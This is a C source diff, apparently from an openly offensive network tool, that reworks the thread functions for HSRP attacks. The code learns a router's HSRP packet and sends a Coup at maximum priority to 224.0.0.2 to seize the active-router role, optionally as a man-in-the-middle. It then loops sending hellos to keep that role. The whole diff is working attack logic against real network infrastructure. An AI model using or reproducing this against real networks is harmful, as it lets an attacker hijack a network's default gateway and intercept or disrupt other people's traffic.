@@ -190,105 +190,96 @@ void hsrp_th_send_raw_exit( struct attacks *attacks )
 }
 
 
-void hsrp_th_become_active(void *arg)
+void hsrp_th_become_active( void *arg )
 {
-   struct pcap_pkthdr header;
-   struct pcap_data pcap_aux;
-   struct attacks *attacks = (struct attacks *)arg;
-   struct hsrp_data *hsrp_data;
-   struct timeval now;
-   sigset_t mask;
-   struct attack_param *param=NULL;
-   u_int32_t lbl32;
-   dlist_t *p;
-   struct interface_data *iface_data;
+    struct attacks *attacks     = (struct attacks *)arg;
+    struct hsrp_data *hsrp_data = (struct hsrp_data *)attacks->data;
+    struct attack_param *param  = attacks->params;
+    struct interface_data *iface_data;
+    struct timeval now;
+    sigset_t mask;
+    struct pcap_pkthdr header;
+    struct pcap_data pcap_aux;
+    u_int32_t lbl32;
+    dlist_t *p;
 
-   pthread_mutex_lock(&attacks->attack_th.finished);
+    pthread_mutex_lock(&attacks->attack_th.finished);
 
-   pthread_detach(pthread_self());
+    pthread_detach(pthread_self());
 
-   sigfillset(&mask);
+    sigfillset(&mask);
 
-   if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
-   {
-      thread_error("hsrp_send_discover pthread_sigmask()",errno);
-      hsrp_th_become_active_exit(attacks);    
-   }
+    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
+    {
+        thread_error("hsrp_send_discover pthread_sigmask()",errno);
+        hsrp_th_become_active_exit(attacks);    
+    }
 
-   hsrp_data = attacks->data;
+    gettimeofday(&now,NULL);
 
-   param = attacks->params;
+    header.ts.tv_sec = now.tv_sec;
+    header.ts.tv_usec = now.tv_usec;
 
-   gettimeofday(&now,NULL);
+    if ( ! hsrp_learn_packet( attacks, NULL, &attacks->attack_th.stop, attacks->data,&header, &pcap_aux ) )
+    {
+        hsrp_data->opcode = HSRP_TYPE_COUP;
+        hsrp_data->state  = HSRP_STATE_SPEAK;
 
-   header.ts.tv_sec = now.tv_sec;
-   header.ts.tv_usec = now.tv_usec;
+        if ( attacks->attack == HSRP_ATTACK_BECOME_ACTIVE )
+            memcpy((void *)&hsrp_data->sip, (void *)param[HSRP_SOURCE_IP].value, 4);
+        else
+        if ( attacks->attack == HSRP_ATTACK_MITM_BECOME_ACTIVE )
+        {
+            /* Get interface's ip address */
+            p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, pcap_aux.iface);
+            iface_data = (struct interface_data *) dlist_data(p);
+            hsrp_data->sip = ntohl(inet_addr(iface_data->ipaddr));
 
-   if (hsrp_learn_packet(attacks, NULL, &attacks->attack_th.stop, attacks->data,&header, &pcap_aux) < 0)
-      hsrp_th_become_active_exit(attacks);
+            /* libnet fix */
+            lbl32 = ntohl(hsrp_data->sip);
+            memcpy((void *)&hsrp_data->sip, &lbl32, 4);
+        }
 
-   hsrp_data->opcode = HSRP_TYPE_COUP;
-   hsrp_data->state = HSRP_STATE_SPEAK;
+        /* libnet fix */
+        hsrp_data->dip = inet_addr("224.0.0.2");
 
-   if (attacks->attack == HSRP_ATTACK_BECOME_ACTIVE)
-   {
-      memcpy((void *)&hsrp_data->sip, (void *)param[HSRP_SOURCE_IP].value, 4);
-   }
-   else 
-      if (attacks->attack == HSRP_ATTACK_MITM_BECOME_ACTIVE) {
-         /* Get interface's ip address */
-         p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, pcap_aux.iface);
-         iface_data = (struct interface_data *) dlist_data(p);
-         hsrp_data->sip = ntohl(inet_addr(iface_data->ipaddr));
+        /* Max priority */
+        hsrp_data->priority = 0xFF;
 
-         /* libnet fix */
-         lbl32 = ntohl(hsrp_data->sip);
-         memcpy((void *)&hsrp_data->sip, &lbl32, 4);
-      }
+        hsrp_send_packet(attacks);
 
-   /* libnet fix */
-   hsrp_data->dip = inet_addr("224.0.0.2");
-   /* Max priority */
-   hsrp_data->priority = 0xFF;
+        hsrp_data->opcode = HSRP_TYPE_HELLO;
+        hsrp_data->state  = HSRP_STATE_ACTIVE;
 
-   hsrp_send_packet(attacks);
+        if ( ! thread_create( &attacks->helper_th, &hsrp_send_hellos, attacks) )
+        {
+            while ( ! attacks->attack_th.stop )
+                thread_usleep( 200000 );
+        }
+        else
+            write_log( 0, "hsrp_th_become_active thread_create error\n" );
+    }
 
-   hsrp_data->opcode = HSRP_TYPE_HELLO;
-   hsrp_data->state = HSRP_STATE_ACTIVE;
-
-   thread_create(&attacks->helper_th.id, &hsrp_send_hellos, attacks);
-
-   while (!attacks->attack_th.stop)
-      thread_usleep(200000);
-
-   hsrp_th_become_active_exit(attacks);
+    hsrp_th_become_active_exit(attacks);
 }
 
 
 void hsrp_th_become_active_exit( struct attacks *attacks )
 {
-    if ( attacks )
-    {
-        attack_th_exit( attacks );
-
-        pthread_mutex_unlock( &attacks->attack_th.finished );
-    }
-
+    attack_th_exit( attacks );
+    pthread_mutex_unlock( &attacks->attack_th.finished );
     pthread_exit(NULL);
 }
 
 
-void
-hsrp_send_hellos(void *arg)
+void hsrp_send_hellos( void *arg )
 {
-    u_int32_t ret;
-    u_int16_t secs;
+    struct attacks *attacks = (struct attacks *)arg;
+    struct hsrp_data *hsrp_data = (struct hsrp_data *)attacks->data;;
     struct timeval hello;
-    struct attacks *attacks;
-    struct hsrp_data *hsrp_data;
+    int ret;
+    u_int16_t secs = 0;
 
-    attacks = arg;
-    
     pthread_mutex_lock(&attacks->helper_th.finished);
 
     pthread_detach(pthread_self());
@@ -296,13 +287,9 @@ hsrp_send_hellos(void *arg)
     hello.tv_sec  = 0;
     hello.tv_usec = 0;
 
-    hsrp_data = attacks->data;
-
-    secs = 0;
-    
-write_log(0,"\n hsrp_helper: %d started...\n",(int)pthread_self());
+    write_log(0,"\n hsrp_helper: %X started...\n",(int)pthread_self());
         
-    while(!attacks->helper_th.stop)
+    while ( !attacks->helper_th.stop)
     {
         if ( (ret=select( 0, NULL, NULL, NULL, &hello ) ) == -1 )
               break;
@@ -311,7 +298,7 @@ write_log(0,"\n hsrp_helper: %d started...\n",(int)pthread_self());
         {
             if (secs == hsrp_data->hello_time) /* Send HSRP hello...*/
             {
-               hsrp_send_packet(attacks);
+               hsrp_send_packet( attacks );
                secs=0;
             }
             else
@@ -321,7 +308,7 @@ write_log(0,"\n hsrp_helper: %d started...\n",(int)pthread_self());
         hello.tv_usec = 0;
     } 
 
-write_log(0," hsrp_helper: %d finished...\n",(int)pthread_self());
+    write_log(0," hsrp_helper: %X finished...\n",(int)pthread_self());
 
     pthread_mutex_unlock(&attacks->helper_th.finished);
      
